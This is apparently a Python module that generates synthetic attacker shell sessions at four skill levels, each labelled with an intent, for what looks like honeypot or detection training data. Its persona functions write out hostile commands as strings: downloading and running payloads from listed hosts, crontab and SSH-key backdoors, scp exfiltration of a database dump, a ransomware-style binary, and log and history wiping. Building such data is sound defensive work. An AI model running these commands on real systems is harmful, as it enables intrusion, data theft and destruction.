"""Synthetic attacker persona scripts (build guide section 3.3).

Each persona is a function that, given an rng, yields a plausible command
sequence for that skill archetype. Randomization (order jitter, typos, tool
name swaps) gives session diversity across many runs of the same persona.
"""
from __future__ import annotations

import random

SKILL_LEVELS = ["novice", "scripted_bot", "intermediate", "advanced"]
INTENTS = ["recon", "credential_theft", "ransomware_staging", "cryptomining",
          "data_exfiltration", "botnet_recruitment"]

TYPO_MAP = {"ls": ["l", "sl", "ls -la"], "cat": ["catt", "cat"], "whoami": ["whoam", "whoami"]}
PAYLOAD_HOSTS = ["185.220.101.4", "45.155.205.233", "cdn-update.info", "sync-relay.net",
                "storage-mirror.biz", "195.201.57.88"]
PAYLOAD_NAMES = ["update.sh", "kworker", "xmr64", "sysinit", "cron.sh", "b.sh", ".hidden/agent"]


def _typo(rng: random.Random, cmd: str) -> str:
    if rng.random() < 0.15 and cmd in TYPO_MAP:
        return rng.choice(TYPO_MAP[cmd])
    return cmd


def script_kiddie_bot(rng: random.Random) -> tuple[list[str], str, str]:
    """Fixed exploit chain, no adaptation, fast, no exploration."""
    host = rng.choice(PAYLOAD_HOSTS)
    name = rng.choice(PAYLOAD_NAMES)
    cmds = [
        "whoami", "uname -a",
        f"wget http://{host}/{name}",
        f"chmod +x {name}",
        f"./{name}",
        "crontab -l",
        f"echo '*/10 * * * * root /root/{name}' >> /etc/crontab",
        "history -c",
    ]
    return cmds, "scripted_bot", rng.choice(["cryptomining", "botnet_recruitment"])


def novice_human(rng: random.Random) -> tuple[list[str], str, str]:
    """Slow, exploratory, typos, gives up on errors, mostly harmless."""
    cmds = [
        _typo(rng, "whoami"), _typo(rng, "ls"), "pwd", "cd /home", _typo(rng, "ls"),
        "cd deploy", _typo(rng, "cat") + " .bash_history",
        "cat deploy.sh", "sudo -l", "id",
    ]
    if rng.random() < 0.4:
        cmds += ["cat /etc/passwd", "exit"]
    else:
        cmds += ["clear", "history", "exit"]
    return cmds, "novice", "recon"


def intermediate_attacker(rng: random.Random) -> tuple[list[str], str, str]:
    """Checks priv-esc paths, downloads tools, some caution."""
    cmds = [
        "whoami", "id", "uname -a", "cat /etc/os-release",
        "sudo -l", "find / -perm -4000 -type f 2>/dev/null",
        "cat /home/deploy/.bash_history", "cat /var/www/app/config.php",
        "netstat -tulpn", "ps aux",
    ]
    branch = rng.random()
    if branch < 0.4:
        cmds += ["mysql -u appuser -p appdb", "cat /etc/mysql/my.cnf"]
        intent = "credential_theft"
    elif branch < 0.7:
        host = rng.choice(PAYLOAD_HOSTS)
        cmds += [f"curl -s http://{host}/stage2.sh -o /tmp/s2.sh",
                 "chmod +x /tmp/s2.sh", "/tmp/s2.sh"]
        intent = "data_exfiltration"
    else:
        cmds += ["crontab -e", "useradd -m svc_update", "ssh-keygen -t rsa -f /tmp/id_rsa -N ''"]
        intent = "botnet_recruitment"
    cmds += ["history -c", "exit"]
    return cmds, "intermediate", intent


def advanced_attacker(rng: random.Random) -> tuple[list[str], str, str]:
    """Disables logging, checks for honeypot/VM artifacts, pivots, exfiltrates, covers tracks."""
    cmds = [
        "whoami", "id", "cat /proc/cpuinfo | grep 'model name'",
        "dmesg | grep -i virtual", "ls -la /dev/disk/by-id/",
        "cat /etc/passwd", "sudo -l", "find / -perm -4000 -type f 2>/dev/null",
        "netstat -tulpn", "ss -antp", "cat /var/www/app/config.php",
        "cat /home/deploy/.bash_history",
    ]
    branch = rng.random()
    if branch < 0.35:
        cmds += ["mysql -u appuser -p appdb",
                 "tar czf /tmp/.cache/db_dump.tar.gz /var/lib/mysql",
                 f"scp /tmp/.cache/db_dump.tar.gz backup@{rng.choice(PAYLOAD_HOSTS)}:/data/"]
        intent = "data_exfiltration"
    elif branch < 0.65:
        cmds += [f"wget http://{rng.choice(PAYLOAD_HOSTS)}/enc.bin -O /tmp/.x/enc.bin",
                 "chmod +x /tmp/.x/enc.bin", "find /home -type f -name '*.sql'",
                 "/tmp/.x/enc.bin --mode=lock --path=/home"]
        intent = "ransomware_staging"
    else:
        cmds += ["ssh-keygen -t ed25519 -f /root/.ssh/id_ed25519 -N ''",
                 "echo 'ssh-ed25519 AAAAC3Nz... backdoor' >> /root/.ssh/authorized_keys",
                 "useradd -m -s /bin/bash svc_backup2", "crontab -e"]
        intent = "botnet_recruitment"
    cmds += ["cat /var/log/auth.log | grep Accepted", "history -c",
            "unset HISTFILE", "iptables -F", "exit"]
    return cmds, "advanced", intent


PERSONAS = {
    "novice": novice_human,
    "scripted_bot": script_kiddie_bot,
    "intermediate": intermediate_attacker,
    "advanced": advanced_attacker,
}


def generate_session(rng: random.Random, persona: str | None = None) -> dict:
    persona = persona or rng.choice(list(PERSONAS.keys()))
    fn = PERSONAS[persona]
    cmds, skill, intent = fn(rng)
    # session-level jitter: occasionally drop or duplicate a benign command
    if rng.random() < 0.2 and len(cmds) > 3:
        idx = rng.randrange(1, len(cmds) - 1)
        cmds.insert(idx, cmds[idx])
    return {"commands": cmds, "skill": skill, "intent": intent, "persona": persona}
